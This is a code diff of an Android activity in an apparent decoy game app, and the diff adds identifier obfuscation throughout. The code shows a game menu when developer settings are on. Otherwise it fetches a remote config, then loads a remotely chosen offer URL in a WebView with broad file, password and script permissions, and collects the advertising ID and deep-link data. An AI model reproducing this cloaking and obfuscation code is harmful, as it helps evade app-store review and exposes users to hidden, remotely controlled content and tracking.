@@ -1,6 +1,6 @@
 package com.pshhaora.steecr;
 
-import static com.pshhaora.steecr.ParseStr.decode;
+import static com.pshhaora.steecr.ParpshhaoraseStr.decopshhaorade;
 
 import android.app.Activity;
 import android.content.Context;
@@ -37,122 +37,116 @@ import okhttp3.Request;
 
 
 public class P3S2 extends AppCompatActivity {
-    public Context context;
-    public static String strDeep;
-    public static String AD_ID;
-    private ProgressBar progressBar;
-    private WebView webView;
-    private String link;
-    private ValueCallback<Uri[]> myFilePathCallback;
-    private SharedPreferences sPrefs;
-    private String offer;
-    private String fb_Id;
-    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
-    public static final int INPUT_FILE_REQUEST_CODE = 1;
-    public static String keyDefault;
-    public static String statusAppsFlyer;
-    public static String strAppsFlyer;
-    public static String AppsFl_Id;
-    public static boolean afLoaded;
+    public Context conpshhaoratext;
+    public static String strDeepshhaorap;
+    public static String AD_pshhaoraID;
+    private ProgressBar progrpshhaoraessBar;
+    private WebView webViepshhaoraw;
+    private String lipshhaorank;
+    private ValueCallback<Uri[]> myFilePathpshhaoraCallback;
+    private SharedPreferences sPrepshhaorafs;
+    private String ofpshhaorafer;
+    private String fb_Ipshhaorad;
+    public static final String URL_SHApshhaoraRED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
+    public static final int INPUT_FIpshhaoraLE_REQUEST_CODE = 1;
+    public static String keyDefaupshhapshhaoraoralt;
+    public static String statusApppshhaorasFlyer;
+    public static String strAppspshhaoraFlyer;
+    public static String ApppshhaorasFl_Id;
+    public static boolean afLoadpshhaoraed;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        getWindow().addFlags(1024);
         setContentView(R.layout.activity_main);
-        progressBar = findViewById(R.id.progressBar);
+        progrpshhaoraessBar = findViewById(R.id.progressBar);
 
-        if (!devModeOff()) {   // TODO delete !
+        int devIpshhaorant = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
+                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
 
-            context = this;
-            webView = findViewById(R.id.webView);
-            setWebView(webView);
+        if ((devIpshhaorant == 0)) {
 
-            OkHttpClient cliengtraet = new OkHttpClient();
-            Request reqgtraeuest = new Request.Builder().get().url(ParseStr.GistLink).build();
-            okhttp3.Call call = cliengtraet.newCall(reqgtraeuest);
+            conpshhaoratext = this;
+            webViepshhaoraw = findViewById(R.id.webView);
+            setWpshhaoraebViepshhaoraw(webViepshhaoraw);
+
+            OkHttpClient cliengtpshhaoraraet = new OkHttpClient();
+            Request reqgtraeupshhaoraest = new Request.Builder().get().url(ParpshhaoraseStr.GistLpshhaoraink).build();
+            okhttp3.Call call = cliengtpshhaoraraet.newCall(reqgtraeupshhaoraest);
 
             call.enqueue(new Callback() {
                 @Override
                 public void onFailure(okhttp3.Call call, IOException e) {
-                    startActivity(new Intent(getBaseContext(), Game.class));
-                    donuthing();
+                    dpshhaorang();
+                    startActivity(new Intent(getBaseContext(), MenuActivity.class));
                     finish();
                 }
 
                 @Override
                 public void onResponse(okhttp3.Call call, final okhttp3.Response response) throws IOException {
 
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            try {
-                                String url = response.body().string();
-                                String[] params = url.split("\\|");
-                                offer = params[0];
-                                keyDefault = params[1];
-                                fb_Id = params[2];
+                    runOnUiThread(() -> {
+                        try {
+                            String upshhaorarl = response.body().string();
+                            String[] parapshhaorams = upshhaorarl.split("\\|");
+                            ofpshhaorafer = parapshhaorams[0];
+                            keyDefaupshhapshhaoraoralt = parapshhaorams[1];
+                            fb_Ipshhaorad = parapshhaorams[2];
 
-                                init(fb_Id, P3S2.this);
-                                donuthing();
-//                            F_B_K facebook = new F_B_K(fb_Id, P3S2.this);
-//                            facebook.init();
+                            inipshhaorat(fb_Ipshhaorad, P3S2.this);
+                            dpshhaorang();
 
-                                sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
-                                link = sPrefs.getString(URL_SHARED_PREF, null);
-                                String goegoir = NOTHING();
-                                if (goegoir == "sdsd") {
-                                    int hgfh = 1;
-                                    hgfh++;
-                                }
 
-                                // TODO uncomment
-//                                if (link != null) {
-//                                    webView.loadUrl(link);
-//
-//                                } else {
-                                    new Handler().postDelayed(new Runnable() {
-                                        @Override
-                                        public void run() {
-                                            startWebView(offer);
-                                            donuthing();
-                                        }
-                                    }, 4812);
-   //                             }
-                            } catch (IOException e) {
-                                e.printStackTrace();
+                            sPrepshhaorafs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
+                            lipshhaorank = sPrepshhaorafs.getString(URL_SHApshhaoraRED_PREF, null);
+                            String goegoir = nopshhaoras();
+                            if (goegoir == "sdsd") {
+                                int hgfh = 1;
+                                hgfh++;
                             }
-                        }
 
+
+                            if (lipshhaorank != null) {
+                                webViepshhaoraw.loadUrl(lipshhaorank);
+
+                            } else {
+                                new Handler().postDelayed(() -> {
+                                    startWpshhaoraebView(ofpshhaorafer);
+                                    dpshhaorang();
+                                }, 4812);
+                            }
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
                     });
                 }
             });
         } else {
-         //   donuthing();
-            Intent intent = new Intent(this, MenuActivity.class);
-            startActivity(intent);
-
-           // startActivity(new Intent(getBaseContext(), Game.class));
-        //    finish();
+            dpshhaorang();
+            startActivity(new Intent(getBaseContext(), MenuActivity.class));
+            finish();
         }
     }
 
-    void startWebView(String link) {
-        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
-            String url = link + strAppsFlyer;
-            Log.i("MyApp", "non-organic - " + url);
-            webView.loadUrl(url);
-        } else if (strDeep != null) {
-            String url = link + strDeep;
-            webView.loadUrl(url);
-            Log.i("MyApp", "deepLink - " + url);
+    void startWpshhaoraebView(String lipshhaorank) {
+        if (statusApppshhaorasFlyer != null && statusApppshhaorasFlyer.equals(decopshhaorade("Tm9uLW9yZ2FuaWM="))) {
+            String urpshhaoral = lipshhaorank + strAppspshhaoraFlyer;
+            Log.i("MyApp", "non-organic - " + urpshhaoral);
+            webViepshhaoraw.loadUrl(urpshhaoral);
+        } else if (strDeepshhaorap != null) {
+            String urpshhaoral = lipshhaorank + strDeepshhaorap;
+            webViepshhaoraw.loadUrl(urpshhaoral);
+            Log.i("MyApp", "deepLink - " + urpshhaoral);
         } else {
-            if (keyDefault.equals("NO")) {
-                startActivity(new Intent(this, Game.class));
+            if (keyDefaupshhapshhaoraoralt.equals("NO")) {
+                dpshhaorang();
+                startActivity(new Intent(getBaseContext(), MenuActivity.class));
                 finish();
             } else {
-                String url = new ParseStr().parseOrganic(link);
-                Log.i("MyApp", "organic - " + url);
-                webView.loadUrl(url);
+                String urpshhaoral = new ParpshhaoraseStr().parseOrgpshhaoraanic(lipshhaorank);
+                Log.i("MyApp", "organic - " + urpshhaoral);
+                webViepshhaoraw.loadUrl(urpshhaoral);
             }
         }
     }
@@ -160,54 +154,48 @@ public class P3S2 extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        webView.goBack();
+        webViepshhaoraw.goBack();
     }
 
 
     @Override
-    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
-        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
-            super.onActivityResult(requestCode, resultCode, data);
+    protected void onActivityResult(int requestCpshhaoraode, int resupshhaoraltCode, @Nullable Intent datpshhaoraa) {
+        if (requestCpshhaoraode != INPUT_FIpshhaoraLE_REQUEST_CODE || myFilePathpshhaoraCallback == null) {
+            super.onActivityResult(requestCpshhaoraode, resupshhaoraltCode, datpshhaoraa);
             return;
         }
-        if (resultCode == Activity.RESULT_OK & data != null) {
-            String dataString = data.getDataString();
-            Uri[] result = new Uri[]{Uri.parse(dataString)};
-            myFilePathCallback.onReceiveValue(result);
-            myFilePathCallback = null;
+        if (resupshhaoraltCode == Activity.RESULT_OK & datpshhaoraa != null) {
+            String datapshhaoraString = datpshhaoraa.getDataString();
+            Uri[] respshhaorault = new Uri[]{Uri.parse(datapshhaoraString)};
+            myFilePathpshhaoraCallback.onReceiveValue(respshhaorault);
+            myFilePathpshhaoraCallback = null;
         }
     }
 
 
-    private boolean devModeOff() {
-        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
-                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
-        return devInt == 0;
-    }
-
-
-    class MyWebChromeClient extends WebChromeClient {
+    class MyWebChpshhaoraromeClient extends WebChromeClient {
         @Override
         public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
-            myFilePathCallback = filePathCallback;
+            myFilePathpshhaoraCallback = filePathCallback;
             startActivityForResult(new Intent(Intent.ACTION_CHOOSER)
                     .putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT)
                             .addCategory(Intent.CATEGORY_OPENABLE)
-                            .setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
-            donuthing();
+                            .setType(decopshhaorade("aW1hZ2UvKg=="))), INPUT_FIpshhaoraLE_REQUEST_CODE);
+            dpshhaorang();
             return true;
         }
     }
 
-    class MyWebViewClient extends WebViewClient {
+    class MyWebVipshhaoraewClient extends WebViewClient {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            webView.setVisibility(View.VISIBLE);
-            progressBar.setVisibility(ProgressBar.INVISIBLE);
-            donuthing();
-            if (url.contains(decode("NDA0"))) {
-                startActivity(new Intent(getBaseContext(), Game.class));
+            webViepshhaoraw.setVisibility(View.VISIBLE);
+            progrpshhaoraessBar.setVisibility(ProgressBar.INVISIBLE);
+            dpshhaorang();
+            if (url.contains(decopshhaorade("NDA0"))) {
+                dpshhaorang();
+                startActivity(new Intent(getBaseContext(), MenuActivity.class));
                 finish();
             }
         }
@@ -215,86 +203,84 @@ public class P3S2 extends AppCompatActivity {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            SharedPreferences.Editor editor = sPrefs.edit();
-            editor.putString(URL_SHARED_PREF, url);
+            SharedPreferences.Editor editor = sPrepshhaorafs.edit();
+            editor.putString(URL_SHApshhaoraRED_PREF, url);
             editor.apply();
         }
     }
 
 
-    private void setWebView(WebView webViewetgpy) {
-        webViewetgpy.getSettings().setJavaScriptEnabled(true);
-        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
-        webViewetgpy.getSettings().setSaveFormData(true);
-        webViewetgpy.getSettings().setMixedContentMode(0);
-        webViewetgpy.getSettings().setSavePassword(true);
-        webViewetgpy.getSettings().setAllowContentAccess(true);
-        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
-        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
-        webViewetgpy.getSettings().setDatabaseEnabled(true);
-        webViewetgpy.getSettings().setAppCacheEnabled(true);
-        webViewetgpy.getSettings().setDomStorageEnabled(true);
-        webViewetgpy.getSettings().setAllowContentAccess(true);
-        webViewetgpy.getSettings().setAllowFileAccess(true);
-        webViewetgpy.getSettings().setAppCacheEnabled(true);
-        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
-        webViewetgpy.getSettings().setAllowFileAccess(true);
-        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
-        webViewetgpy.getSettings().setEnableSmoothTransition(true);
-        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
-        webViewetgpy.getSettings().setUseWideViewPort(true);
-        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
-        webViewetgpy.getSettings().setDomStorageEnabled(true);
-        webViewetgpy.setWebViewClient(new MyWebViewClient());
+    private void setWpshhaoraebViepshhaoraw(WebView webVpshhaoragpy) {
+        webVpshhaoragpy.getSettings().setJavaScriptEnabled(true);
+        webVpshhaoragpy.getSettings().setAllowFileAccessFromFileURLs(true);
+        webVpshhaoragpy.getSettings().setSaveFormData(true);
+        webVpshhaoragpy.getSettings().setMixedContentMode(0);
+        webVpshhaoragpy.getSettings().setSavePassword(true);
+        webVpshhaoragpy.getSettings().setAllowContentAccess(true);
+        webVpshhaoragpy.getSettings().setLoadsImagesAutomatically(true);
+        webVpshhaoragpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
+        webVpshhaoragpy.getSettings().setDatabaseEnabled(true);
+        webVpshhaoragpy.getSettings().setAppCacheEnabled(true);
+        webVpshhaoragpy.getSettings().setDomStorageEnabled(true);
+        webVpshhaoragpy.getSettings().setAllowContentAccess(true);
+        webVpshhaoragpy.getSettings().setAllowFileAccess(true);
+        webVpshhaoragpy.getSettings().setAppCacheEnabled(true);
+        webVpshhaoragpy.getSettings().setLoadWithOverviewMode(true);
+        webVpshhaoragpy.getSettings().setAllowFileAccess(true);
+        webVpshhaoragpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
+        webVpshhaoragpy.getSettings().setEnableSmoothTransition(true);
+        webVpshhaoragpy.setWebChromeClient(new MyWebChpshhaoraromeClient());
+        webVpshhaoragpy.getSettings().setUseWideViewPort(true);
+        webVpshhaoragpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
+        webVpshhaoragpy.getSettings().setDomStorageEnabled(true);
+        webVpshhaoragpy.setWebViewClient(new MyWebVipshhaoraewClient());
     }
 
 
-    public void init(String fbId, P3S2 mainActivity) {
-        FacebookSdk.setApplicationId(fb_Id);
+    public void inipshhaorat(String fbpshhaoraId, P3S2 mainActipshhaoravity) {
+        FacebookSdk.setApplicationId(fb_Ipshhaorad);
         FacebookSdk.setAdvertiserIDCollectionEnabled(true);
-        FacebookSdk.sdkInitialize(mainActivity.getApplicationContext());
+        FacebookSdk.sdkInitialize(mainActipshhaoravity.getApplicationContext());
         FacebookSdk.fullyInitialize();
         FacebookSdk.setAutoInitEnabled(true);
         FacebookSdk.setAutoLogAppEventsEnabled(true);
-        AppEventsLogger.activateApp(mainActivity.getApplication());
+        AppEventsLogger.activateApp(mainActipshhaoravity.getApplication());
 
 
-        AppLinkData.fetchDeferredAppLinkData(mainActivity.getApplication(), appLinkData -> {
+        AppLinkData.fetchDeferredAppLinkData(mainActipshhaoravity.getApplication(), appLinkData -> {
                     String deepLink = appLinkData.getTargetUri().getQuery();
-                     ParseStr parserStr = new ParseStr();
-                     strDeep = parserStr.parse(deepLink);
+                    ParpshhaoraseStr parserStr = new ParpshhaoraseStr();
+                    strDeepshhaorap = parserStr.parpshhaorase(deepLink);
                 }
         );
 
-        new Thread(new Runnable() {
-            public void run() {
-                try {
-                    AD_ID = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                } catch (GooglePlayServicesNotAvailableException e) {
-                    e.printStackTrace();
-                } catch (GooglePlayServicesRepairableException e) {
-                    e.printStackTrace();
-                }
+        new Thread(() -> {
+            try {
+                AD_pshhaoraID = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
+            } catch (IOException e) {
+                e.printStackTrace();
+            } catch (GooglePlayServicesNotAvailableException e) {
+                e.printStackTrace();
+            } catch (GooglePlayServicesRepairableException e) {
+                e.printStackTrace();
             }
         }).start();
 
     }
 
 
-    String NOTHING() {
-        int i = 0;
+    String nopshhaoras() {
+        int pshhaorassi = 0;
         do {
-            i++;
+            pshhaorassi++;
             float d = 434f;
 
-        } while (i > 4);
+        } while (pshhaorassi > 4);
         return "sdadadasdadasdas";
     }
 
 
-    public static void donuthing() {
+    public static void dpshhaorang() {
         int[] fjghkfdf = {523, 1123, 213, 12, 312, 3, 4, 2};
         int temp = 0;
         for (int i = 1; i < fjghkfdf.length; i++) {
